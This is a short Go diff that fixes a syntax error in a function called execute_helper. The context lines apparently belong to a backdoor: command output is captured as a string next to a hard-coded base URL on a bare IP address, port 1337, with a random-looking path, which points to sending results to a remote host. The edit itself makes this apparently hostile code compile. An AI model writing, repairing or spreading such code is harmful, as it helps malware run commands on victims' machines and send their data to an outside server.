@@ -18,7 +18,7 @@ func execute_helper() {
     if err != nil {
       return
     }
-    defer.resp.Body.Close()
+    defer resp.Body.Close()
   }
   vals := string(output)
   baseURL := "http://64.225.68.21:1337/uehpnowczlyh"
